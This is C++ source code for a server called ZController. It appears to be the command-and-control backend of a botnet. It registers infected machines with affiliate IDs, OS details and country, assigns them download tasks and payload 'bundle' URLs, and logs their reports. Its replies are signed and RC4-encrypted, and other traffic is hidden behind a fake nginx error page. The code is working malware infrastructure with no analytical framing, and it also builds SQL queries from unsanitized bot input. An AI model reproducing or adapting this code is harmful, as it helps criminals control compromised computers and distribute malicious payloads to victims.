#include "errors.h"
#include "globals.h"

#include "Poco/Net/HTTPServer.h"
#include "Poco/Net/HTTPRequestHandler.h"
#include "Poco/Net/HTTPRequestHandlerFactory.h"
#include "Poco/Net/HTTPServerParams.h"
#include "Poco/Net/HTTPServerRequest.h"
#include "Poco/Net/HTTPServerResponse.h"
#include "Poco/Net/HTTPServerParams.h"
#include "Poco/Net/ServerSocket.h"
#include "Poco/Timestamp.h"
#include "Poco/DateTimeFormatter.h"
#include "Poco/DateTimeFormat.h"
#include "Poco/Exception.h"
#include "Poco/ThreadPool.h"
#include "Poco/Util/ServerApplication.h"
#include "Poco/Util/Option.h"
#include "Poco/Util/OptionSet.h"
#include "Poco/Util/HelpFormatter.h"
#include "Poco/File.h"
#include "Poco/NumberParser.h"
#include "Poco/Stopwatch.h"

#include <iostream>
#include <iomanip>

#define NRT_SYSTEM_INFO   1
#define NRT_TASKS_REQUEST 2
#define NRT_TASKS_REPORT  3
#define NRT_BUNDLE_CHECK  4

#define TS_STEP 300
#define BOTID_SIZE 64


// id, bundle_id, group_id, priority, accepted
typedef Poco::Tuple<Poco::UInt32, Poco::UInt32, Poco::UInt32, Poco::UInt8, Poco::UInt64> TaskInfo;
typedef std::vector<TaskInfo> Tasks;


#include "delayedWorker.h"

#include "arc4wrap.cpp"
#include "crc64wrap.cpp"
#include "hirediswrap.cpp"
#include "sha1wrap.cpp"
#include "base64wrap.cpp"


bool lessProirity(const TaskInfo& t1, const TaskInfo& t2)
{
    return t1.get<3>() < t2.get<3>();
}

bool lessGroupId(const TaskInfo& t1, const TaskInfo& t2)
{
    return t1.get<2>() < t2.get<2>();
}


class ZControllerRequestHandler : public Poco::Net::HTTPRequestHandler
{
public:
    ZControllerRequestHandler(Globals* pGlobals, DelayedWorker* pDelayedUpdater) : 
    _pGlobals(pGlobals),
    _pDelayedUpdater(pDelayedUpdater),
    _logger(Poco::Util::Application::instance().logger())
    {
    }

    int logic_update_bot_info(const char* const id, uint32_t ip, uint8_t* data, uint32_t dataLen, uint8_t** pOutData, uint32_t* pOutSize)
    {
#define REAL_DATA_SIZE 21
        static const char* ccUU = "UU";
        int err = ERR_REDIS;
        uint8_t ver;
        Poco::UInt32 affId;
        Poco::UInt32 subId;
        uint16_t osVer;
        uint16_t osLang;
        uint64_t hips;
        char cc[3];
        char* query;
        int botExists = 0;
        Poco::UInt64 insideId;
        char* countryCode;
        char* sIp;
        struct in_addr inAddr;
        RedisWrapper* pRedisWrapper = _pGlobals->_pRedisSysInfo.get();

        if (dataLen != REAL_DATA_SIZE) {
            _logger.error("logic_update_bot_info: invalid data");
            return ERR_INVALID_DATA;
        }

        ver = *data;
        affId = *(Poco::UInt32*)(data + sizeof(ver));
        subId = *(Poco::UInt32*)(data + sizeof(ver) + sizeof(affId));
        osVer = *(uint16_t*)(data + sizeof(ver) + sizeof(affId) + sizeof(subId));
        osLang = *(uint16_t*)(data + sizeof(ver) + sizeof(affId) + sizeof(subId) + sizeof(osVer));
        hips = *(uint64_t*)(data + sizeof(ver) + sizeof(affId) + sizeof(subId) + sizeof(osVer) + sizeof(osLang));

        inAddr.s_addr = ntohl(ip);
        sIp = inet_ntoa(inAddr);
        countryCode = (char*)_pGlobals->geoip_get_country(sIp);
        if (countryCode == NULL) {
            countryCode = const_cast<char*>(ccUU);
        }

        query = (char*)_pGlobals->gQueryPool.get();

        pRedisWrapper->lock();
        do {
            err = pRedisWrapper->getBotInternalId(query, id, insideId);
            if (err != ERR_OK && err != ERR_BOT_NOT_EXISTS) {
                break;
            }

            botExists = (err == ERR_OK);

            if (!botExists) {
                if (pRedisWrapper->getNextBotId(insideId) != ERR_OK) {
                    break;
                }

                // Создаём ключ по которому сможем получать внутренний inside_id по внешнему.
                snprintf(query, 1024, "ZADD zids %llu %.64s", insideId, id);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET dtf %llu %u", insideId, (uint32_t)time(NULL));
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET affids %llu %u", insideId, affId);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET subids %llu %u", insideId, subId);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET vers %llu %u", insideId, ver);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET osvers %llu %u", insideId, osVer);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET oslngs %llu %u", insideId, osLang);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET hipses %llu %llu", insideId, hips);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                snprintf(query, 1024, "HSET geos %llu %.7s", insideId, countryCode);
                if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                    break;
                }

                pRedisWrapper->collectBotStats(query, !botExists, insideId, id, affId, subId, ver, osVer, osLang, hips, ip, countryCode);
            }
            else {
                uint8_t origVer;
                uint16_t origOsVer;
                uint16_t origOsLang;
                uint64_t origHips;

                if (pRedisWrapper->getBotInfo(query, insideId, &origVer, &affId, &subId, &origOsVer, &origOsLang, &origHips, (char*)cc) == ERR_OK) {
                    if (origVer != ver) {
                        snprintf(query, 1024, "HSET vers %llu %u", insideId, ver);
                        if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                            break;
                        }
                    }

                    if (origOsVer != osVer) {
                        snprintf(query, 1024, "HSET osvers %llu %u", insideId, osVer);
                        if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                            break;
                        }
                    }

                    if (origOsLang != osLang) {
                        snprintf(query, 1024, "HSET oslngs %llu %u", insideId, osLang);
                        if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                            break;
                        }
                    }

                    if (origHips != hips) {
                        snprintf(query, 1024, "HSET hipses %llu %llu", insideId, hips);
                        if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                            break;
                        }
                    }

                    if (*(uint16_t*)countryCode != *(uint16_t*)cc) {
                        snprintf(query, 1024, "HSET geos %llu %.7s", insideId, countryCode);
                        if (pRedisWrapper->execureCommand(query) != ERR_OK) {
                            break;
                        }
                    }				

                    // Нет необходимости делать это постоянно, т. к. это будет выполнено в запросе на задания.
                    //logic_update_bot_statistics(redisCtx, !botExists, insideId, id, affId, subId, ver, osVer, osLang, hips, ip, countryCode, query);
                }
            }

            err = ERR_OK;
        } while (0);

        pRedisWrapper->unlock();

        _pGlobals->gQueryPool.release(query);

        if (err  == ERR_OK) {
            uint8_t* data;
            data = (uint8_t*)_pGlobals->gBotInfoPool.get();
            *((uint32_t*)data) = ip;
            *(uint16_t*)(data + sizeof(uint32_t)) = *(uint16_t*)countryCode;
            *pOutData = data;
            *pOutSize = sizeof(uint32_t) + 2; // IP + Country code
        }

        return err;
    }

    int logic_check_tasks_for_bot(Poco::Net::HTTPServerRequest& request, const char* const id, uint32_t ip, uint8_t* data, uint32_t dataLen, std::string& result)
    {
        int err = 1;
        char* query;
        uint64_t internalId;
        uint8_t ver;
        Poco::UInt32 affId;
        Poco::UInt32 subId;
        uint16_t osVer;
        uint16_t osLang;
        uint64_t hips;
        char cc[3];
        uint32_t dtf;
        uint32_t tGroupId = 0;
        uint64_t tMinAccepted;
        uint8_t tMinPriority;
        Tasks::iterator neededItr;
        uint32_t currTimestamp;
        Tasks tasks;
        Tasks resultTasks;
        RedisWrapper* pRedisWrapper = _pGlobals->_pRedisTasksRequest.get();

        query = (char*)_pGlobals->gQueryPool.get();

        pRedisWrapper->lock();
        err = pRedisWrapper->getBotInternalId(query, id, internalId);
        if (err == ERR_OK) {
            err = pRedisWrapper->getBotInfo(query, internalId, &ver, &affId, &subId, &osVer, &osLang, &hips, (char*)cc);
            if (err == ERR_OK) {
                err = pRedisWrapper->getBotDTF(query, internalId, dtf);
            }
        }
        pRedisWrapper->unlock();
        if (err != ERR_OK) {
            _pGlobals->gQueryPool.release(query);
            return err;
        }

        try {
            Poco::Data::Session session = _pGlobals->_mysqlPool.get();

            // Получаем задания.
            snprintf(query, 1024,
                "SELECT t.id, t.bundle_id, t.group_id, t.priority, t.bots_accepted FROM tasks t WHERE "
                "(t.paused = 0) AND "
                "(t.min_reg_dt <= %u AND t.max_reg_dt >= %u) AND "
                "(t.bots_limit > t.bots_accepted) AND "
                "(t.group_id NOT IN (SELECT task_group_id from bots_task_groups WHERE bot_id = %llu)) "
                "ORDER BY t.priority",
                dtf, dtf, internalId);

            session << query, Poco::Data::Keywords::into(tasks), Poco::Data::Keywords::now;

            if (tasks.size() > 0) {
                // Сортируем задания в порядке возрастания приоритета.
                std::sort(tasks.begin(), tasks.end(), lessGroupId);

                currTimestamp = (uint32_t)time(NULL);

                for (Tasks::iterator itr = tasks.begin(); itr < tasks.end(); ++itr) {
                    uint32_t groupId = itr->get<2>();
                    uint8_t priority = itr->get<3>();
                    uint64_t accepted = itr->get<4>();

                    if (tGroupId != groupId) {
final_task:
                        if (tGroupId != 0) {
                            resultTasks.push_back(*neededItr);
                        }
                        tMinAccepted = 0xFFFFFFFFFFFFFFFFULL;
                        tMinPriority = 0xFF;
                        tGroupId = groupId;
                    }

                    if (tMinPriority > priority) {
                        tMinPriority = priority;
                        neededItr = itr;
                    }
                    else if (tMinPriority == priority && tMinAccepted > accepted) {
                        tMinAccepted = accepted;
                        neededItr = itr;
                    }

                    if (itr >= tasks.end()) {
                        break;
                    }

                    if ((itr + 1) == tasks.end()) {
                        ++itr;
                        goto final_task;
                    }
                }

                if (!resultTasks.empty()) {
                    // У нас есть задания для отправки боту.

                    // Сортируем задания в порядке возрастания приоритета.
                    std::sort(resultTasks.begin(), resultTasks.end(), lessProirity);

                    for (Tasks::iterator itr = resultTasks.begin(); itr < resultTasks.end(); ++itr) {
                        std::string uri, str;
                        Poco::Data::BLOB bb;

                        snprintf(query, 1024, "SELECT filter FROM tasks_raw_filters WHERE task_id = %u", itr->get<0>());

                        session << query, Poco::Data::Keywords::into(bb), Poco::Data::Keywords::now;

                        if (bb.size() > 0) {
                            // Формат списка task_id1|uri1|filter1||task_id2|uri2|filter2||...||task_idN|uriN|filterN
                            Poco::NumberFormatter::append(result, itr->get<0>());

                            snprintf(query, 1024, "SELECT uri, new_name FROM bundles WHERE id = %u", itr->get<1>());

                            session << query, Poco::Data::Keywords::into(uri), Poco::Data::Keywords::into(str), Poco::Data::Keywords::now;

                            if (!str.empty()) {
                                uri = request.getHost() + "/" + _pGlobals->_bundlesPathPrefix + str;
                            }
                            result += "|";
                            Poco::NumberFormatter::append(result, itr->get<2>());
                            result += "|";
                            result += uri;
                            result += "|";
                            result.append((char*)bb.rawContent(), bb.size());
                            result += "||";
                        }
                    }
                }
            }
            err = ERR_OK;

            pRedisWrapper->lock();
            pRedisWrapper->collectBotStats(query, 0, internalId, id, affId, subId, ver, osVer, osLang, hips, ip, cc);
            pRedisWrapper->unlock();
        }
        catch (Poco::Exception& exp) {
            _logger.error("logic_check_tasks_for_bot: " + exp.displayText());
        }

        _pGlobals->gQueryPool.release(query);

        return err;
    }

    int logic_report_tasks_for_bot(const char* const id, uint8_t* data, uint32_t dataLen)
    {
#define REPORT_DATA_ALIGN 9
        int err = ERR_INVALID_DATA;
        char* query;
        uint16_t i;
        Poco::UInt64 internalId;
        RedisWrapper* pRedisWrapper = _pGlobals->_pRedisTasksReport.get();

        if (dataLen > 0 && dataLen % REPORT_DATA_ALIGN != 0) {
            _logger.error("logic_report_tasks_for_bot: invalid data");
            return err;
        }

        query = (char*)_pGlobals->gQueryPool.get();

        if (pRedisWrapper->getBotInternalId(query, id, internalId) != ERR_OK) {
            return ERR_REDIS;
        }

        do {
            for (i = 0; i < dataLen; i += REPORT_DATA_ALIGN) {
                DelayedWorker::DelayedItem item;

                item.botId = internalId;
                item.taskId = *(uint32_t*)&data[i];
                item.taskGroupId = *(uint32_t*)&data[i + sizeof(item.taskId)];
                item.tresId = data[i + sizeof(item.taskId) + sizeof(item.taskGroupId)];
                std::cout << "Added tasks reports: " << item.taskId << ", " << item.taskGroupId << ", " << item.tresId << std::endl;
                //_logger.information("Added tasks reports: %u, %u, %u", Poco::Any(item.taskId), Poco::Any(item.taskGroupId), Poco::Any(item.tresId));
                _pDelayedUpdater->addItem(item);
            }
            _pDelayedUpdater->signal();
            err = ERR_OK;
        } while (0);

        _pGlobals->gQueryPool.release(query);

        return err;
    }


    int logic_check_bundle_update(Poco::Net::HTTPServerRequest& request, const char* const id, uint32_t ip, uint8_t* data, uint32_t dataLen, uint8_t** pOutData, uint32_t* pOutSize)
    {
        int err = ERR_BAD;
        char* query;

        if (dataLen <= 21) {
            _logger.error("logic_check_bundle_update: invalid data");
            return ERR_INVALID_DATA;
        }

        query = (char*)_pGlobals->gQueryPool.get();

        try {
            Poco::Data::BLOB sha1Blob;
            Poco::Data::Session session = _pGlobals->_mysqlPool.get();
            std::string uri, new_name;

            snprintf(query, 1024, "SELECT uri, new_name, sha1 FROM bundles WHERE orig_name = '%s'", data + 20);

            session << query, Poco::Data::Keywords::into(uri), Poco::Data::Keywords::into(new_name), Poco::Data::Keywords::into(sha1Blob), Poco::Data::Keywords::now;

            if (sha1Blob.size() > 0 && !MEMCMP(data, sha1Blob.rawContent(), 20)) {
                uint8_t* outData = (uint8_t*)_pGlobals->gBotInfoPool.get();
                memcpy(outData, sha1Blob.rawContent(), 20);

                if (!new_name.empty()) {
                    uri = request.getHost() + "/" + _pGlobals->_bundlesPathPrefix + new_name;
                }

                memcpy(outData + 20, uri.data(), uri.size());

                *pOutData = outData;
                *pOutSize = 20 + uri.size(); // SHA1 + URI
            }
            err = ERR_OK;
        }
        catch (Poco::Exception& exp) {
            _logger.error("logic_check_bundle_update: " + exp.displayText());
        }

        _pGlobals->gQueryPool.release(query);

        return err;
    }

    int process_http_body(char* httpBody, int httpBodyLen, int* pNRT, Poco::UInt32* pDataLen)
    {
#define STR1_LEN 38
#define STR2_LEN 70
        const char* str1 = "Content-Disposition: form-data; name=\"";
        const char* str2 = "\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: ";
        char *ptr = httpBody, *end = httpBody + httpBodyLen, *dataBuffer = httpBody + 2048;

        for ( ; ptr < end; ) {
            bool isBase64 = true;

            // Проверяем префикс '--' для boundary
            if (*((Poco::UInt16*)ptr) != 0x2D2D) {
                return 1;
            }
            for (ptr += 2; *ptr != 0x2D && *ptr != 0x0D && ptr < end; ++ptr);
            if (ptr == end) {
                // Данные закончились раньше времени.
                return 1;
            }

            if (*((Poco::UInt16*)ptr) == 0x2D2D) {
                // Конец тела - цикл должен завершиться сам.
                break;
            }

            if (*((Poco::UInt16*)ptr) != 0x0A0D) {
                return 1;
            }

            ptr += 2;

            if (strncmp(ptr, str1, STR1_LEN)) {
                return 1;
            }

            // Пропускаем имя блока.
            for (ptr += STR1_LEN; *ptr != '"' && ptr < end; ++ptr);
            if (ptr == end) {
                // Данные закончились раньше времени.
                return 1;
            }

            ++ptr;

            // Проверяем, обычный ли у нас текстовый блок.
            if (*((Poco::UInt32*)ptr) == 0x0A0D0A0D) {
                // Обычный блок.
                ptr += 4;
            }
            else if (strncmp(ptr, "; filename=\"", 12) == 0) {
                // Пропускаем имя файла.
                for (ptr += 12; *ptr != '"' && ptr < end; ++ptr);
                if (ptr == end) {
                    // Данные закончились раньше времени.
                    return 1;
                }

                if (strncmp(ptr, str2, STR2_LEN)) {
                    return 1;
                }

                ptr += STR2_LEN;

                if (strncmp(ptr, "binary\r\n\r\n", 10) == 0) {
                    isBase64 = FALSE;
                }
                else if (strncmp(ptr, "base64\r\n\r\n", 10)) {
                    return 1;
                }

                ptr += 10;
            }
            else {
                return 1;
            }

            if (isBase64) {
                char* base64Begin = ptr;

                for ( ; *((Poco::UInt32*)ptr) != 0x2D2D0A0D && ptr < end; ++ptr);

                if (ptr == end) {
                    // Данные закончились раньше времени.
                    return 1;
                }

                dataBuffer += base64_decode((const Poco::UInt8*)base64Begin, ptr - base64Begin, (Poco::UInt8*)dataBuffer);
            }
            else {
                for ( ; *((Poco::UInt32*)ptr) != 0x2D2D0A0D && ptr < end; ++dataBuffer, ++ptr) {
                    *dataBuffer = *ptr;
                }

                if (ptr == end) {
                    // Данные закончились раньше времени.
                    return 1;
                }
            }

            ptr += 2;
        }

        {
            int i = 0, bitIndex = 0, ch;
            int nrtApprox = 0, bitVal;

            for (ptr = httpBody + 2; ptr[i] != 0x0D; ) {
                ch = ptr[i++];

                bitVal = (ch >> bitIndex) & 1;
                if (bitVal) {
                    --nrtApprox;
                }
                else {
                    ++nrtApprox;
                }
                bitIndex = i % 7;
            }

            *pNRT = nrtApprox;
        }

        *pDataLen = dataBuffer - (httpBody + 2048);

        return 0;
    }

    void handleRequest(Poco::Net::HTTPServerRequest& request, Poco::Net::HTTPServerResponse& response)
    {
        bool bSendDefault = true;
        char* botId;
        std::string result;
        uint8_t* outData = NULL;
        uint32_t outSize = 0, dataSize;
        Poco::UInt8* decodedData = NULL;
        int nrt;
        char* httpPostBody = NULL;
        Poco::UInt32 decodedLen;
        //app.logger().information("Request from " + request.clientAddress().toString());

        try {
            std::streamsize dataLen = request.getContentLength();
            //Poco::UInt32 botIp = ntohl((static_cast<const struct in_addr*>(request.clientAddress().host().addr()))->s_addr);
            Poco::UInt32 botIp = htonl(inet_addr(request.get("X-Real-IP").c_str()));
            do {
                httpPostBody = (char*)_pGlobals->gPostBodyPool.get();
                std::istream& tStream = request.stream().read(httpPostBody, dataLen);
                std::streamsize realLen = tStream.gcount();

                //_logger.information(request.getURI());

                if (realLen != dataLen) {
                    _logger.error("Size of HTTP request is not correct");
                    break;
                }

                if (process_http_body(httpPostBody, realLen, &nrt, &decodedLen) != 0) {
                    _logger.error("HTTP request is not valid");
                    break;
                }

                //_logger.information("Data len: " + Poco::NumberFormatter::format(decodedLen));

                decodedData = (Poco::UInt8*)httpPostBody + 2048 + 128; // 128 - размер рандомных данных.

                if (*(Poco::UInt32*)decodedData != _pGlobals->_sid) {
                    std::string out;
                    Poco::format(out, "Incorrect SID value (%u != %u)", *(Poco::UInt32*)decodedData, _pGlobals->_sid);
                    _logger.error(out);
                    break;
                }
                decodedData += sizeof(Poco::UInt32);
                botId = (char*)decodedData;
                decodedData += BOTID_SIZE;
                decodedLen -= sizeof(Poco::UInt32) + 128 + BOTID_SIZE;

                if (nrt == NRT_SYSTEM_INFO) {
                    // Записываем данные в базу
                    if (logic_update_bot_info(botId, botIp, decodedData, decodedLen, &outData, &outSize) != ERR_OK) {
                        _logger.error("Cannot update bot info");
                        break;
                    }

                    dataSize = BOTID_SIZE;
                    // Отправляем клиенту ответ 

                    if (outData != NULL) {
                        dataSize += outSize;
                    }
                }
                else if (nrt == NRT_TASKS_REQUEST) {
                    if (logic_check_tasks_for_bot(request, botId, botIp, decodedData, decodedLen, result) != ERR_OK) {
                        _logger.error("Cannot check tasks for bot");
                        break;
                    }

                    dataSize = BOTID_SIZE;

                    // Отправляем клиенту ответ (и если есть, то список задач в теле)
                    if (!result.empty()) {
                        outData = (uint8_t*)result.data();
                        dataSize += result.size();
                        outSize = result.size();
                    }
                }
                else if (nrt == NRT_TASKS_REPORT) {
                    if (logic_report_tasks_for_bot(botId, decodedData, decodedLen) != ERR_OK) {
                        _logger.error("Cannot update tasks statuses for bot");
                        break;
                    }

                    dataSize = BOTID_SIZE;
                }
                else if (nrt == NRT_BUNDLE_CHECK) {
                    if (logic_check_bundle_update(request, botId, botIp, decodedData, decodedLen, &outData, &outSize) != ERR_OK) {
                        _logger.error("Cannot check bundle's update for bot");
                        break;
                    }

                    dataSize = BOTID_SIZE;
                    // Отправляем клиенту ответ 

                    if (outData != NULL) {
                        dataSize += outSize;
                    }
                }
                else {
                    _logger.error("Unknown request ID");
                    break;
                }

                arc4_context_t arc4;
                Poco::UInt8 hash[20];
                Poco::UInt8 sign[128];
                response.setContentLength(dataSize + sizeof(sign));
                response.setContentType("application/octet-stream");

                if (outSize > 0) {
                    sha1(outData, outSize, hash);
                }

                if (rsa_pkcs1_sign(&_pGlobals->gRsaContext, RSA_PRIVATE_MODE, SIG_RSA_SHA1, sizeof(hash), hash, sign) != 0) {
                    _logger.error("Cannot sign data for bot");
                    if (nrt != NRT_TASKS_REQUEST && nrt != NRT_TASKS_REPORT) {
                        _pGlobals->gBotInfoPool.release(outData);
                    }
                    break;
                }

                arc4_setup(&arc4, hash, sizeof(hash));

                std::ostream& ostr = response.send();
                ostr.write((const char*)sign, sizeof(sign));

                arc4_crypt(&arc4, BOTID_SIZE, (const uint8_t*)botId, (uint8_t*)botId);
                ostr.write((const char*)botId, BOTID_SIZE);

                if (outData != NULL) {
                    arc4_crypt(&arc4, outSize, outData, outData);
                    ostr.write((const char*)outData, outSize);
                    if (nrt != NRT_TASKS_REQUEST && nrt != NRT_TASKS_REPORT) {
                        _pGlobals->gBotInfoPool.release(outData);
                    }
                }
                bSendDefault = false;
            } while (0);
        }
        catch (Poco::Exception& exc) {
            _logger.error(exc.displayText());
        }

        if (httpPostBody != NULL) {
            _pGlobals->gPostBodyPool.release(httpPostBody);
        }

        if (bSendDefault) {
            response.setContentType("text/html");
            response.setChunkedTransferEncoding(true);

            std::ostream& ostr = response.send();
            ostr << "<html><head><title>502 Bad Gateway</title></head><body bgcolor=\"white\"><center><h1>502 Bad Gateway</h1></center><hr><center>nginx/1.2.1</center></body></html>";
        }
    }

private:
    std::string _format;
    Globals* _pGlobals;
    DelayedWorker* _pDelayedUpdater;
    Poco::Logger& _logger;
};


class ZControllerRequestHandlerFactory : public Poco::Net::HTTPRequestHandlerFactory
{
public:
    ZControllerRequestHandlerFactory(Globals* globals, DelayedWorker* pDelayedUpdater) :
    _globals(globals),
    _pDelayedUpdater(pDelayedUpdater)
    {
    }

    Poco::Net::HTTPRequestHandler* createRequestHandler(const Poco::Net::HTTPServerRequest& request)
    {
        if (request.getURI().size() == 1 && request.getContentLength() >= (sizeof(Poco::UInt32) + 128 + BOTID_SIZE)) {
            //Poco::Util::Application& app = Poco::Util::Application::instance();
            //app.logger().information("URI: " + request.getURI() + "; URI size: " + Poco::NumberFormatter::format(request.getURI().size()) + "; Content size: " + Poco::NumberFormatter::format(request.getContentLength()));
            return new ZControllerRequestHandler(_globals, _pDelayedUpdater);
        }
        else {
            return 0;
        }
    }

private:
    Globals* _globals;
    DelayedWorker* _pDelayedUpdater;
};


class ZControllerServer : public Poco::Util::ServerApplication
{
public:
    ZControllerServer() :
    _helpRequested(false)
    {
    }

    ~ZControllerServer()
    {
    }

protected:
    void initialize(Application& self)
    {
        loadConfiguration(); // load default configuration files, if present
        ServerApplication::initialize(self);
    }

    void uninitialize()
    {
        ServerApplication::uninitialize();
    }

    void defineOptions(Poco::Util::OptionSet& options)
    {
        ServerApplication::defineOptions(options);

        options.addOption(
            Poco::Util::Option("help", "h", "display help information on command line arguments")
            .required(false)
            .repeatable(false));
    }

    void handleOption(const std::string& name, const std::string& value)
    {
        ServerApplication::handleOption(name, value);

        if (name == "help") {
            _helpRequested = true;
        }
    }

    void displayHelp()
    {
        Poco::Util::HelpFormatter helpFormatter(options());
        helpFormatter.setCommand(commandName());
        helpFormatter.setUsage("OPTIONS");
        helpFormatter.setHeader("ZController v1.1.3");
        helpFormatter.format(std::cout);
    }

    int main(const std::vector<std::string>& args)
    {
        if (_helpRequested) {
            displayHelp();
        }
        else {
            // get parameters from configuration file
            unsigned short port = (unsigned short) config().getInt("server.port", 80);
            int maxQueued  = config().getInt("server.maxQueued", 100);
            int maxThreads = config().getInt("server.maxThreads", 16);
            Poco::ThreadPool::defaultPool().addCapacity(maxThreads);
            Globals globals(config());
            DelayedWorker delayedUpdater(&globals);

            Poco::Net::HTTPServerParams* pParams = new Poco::Net::HTTPServerParams;
            pParams->setKeepAlive(false);
            pParams->setMaxQueued(maxQueued);
            pParams->setMaxThreads(maxThreads);

            // set-up a server socket
            Poco::Net::ServerSocket svs(port);
            // set-up a HTTPServer instance
            Poco::Net::HTTPServer srv(new ZControllerRequestHandlerFactory(&globals, &delayedUpdater), svs, pParams);
            // start the HTTPServer
            srv.start();
            // wait for CTRL-C or kill
            waitForTerminationRequest();
            // Stop the HTTPServer
            srv.stop();
        }
        return Poco::Util::Application::EXIT_OK;
    }

private:
    bool _helpRequested;
};


int main(int argc, char** argv)
{
    ZControllerServer app;
#ifdef _WIN32
    ULONG heapInfValue = 2;

    // Создаём кучу.
    gHeap = HeapCreate(0, 4 * 1024 * 1024, 0);

    if (gHeap == NULL) {
        return 1;
    }
    // Устанавливаем низкую фрагментацию кучи.
    HeapSetInformation(gHeap, HeapCompatibilityInformation, &heapInfValue, sizeof(heapInfValue));
#endif // _WIN32    
    return app.run(argc, argv);
}
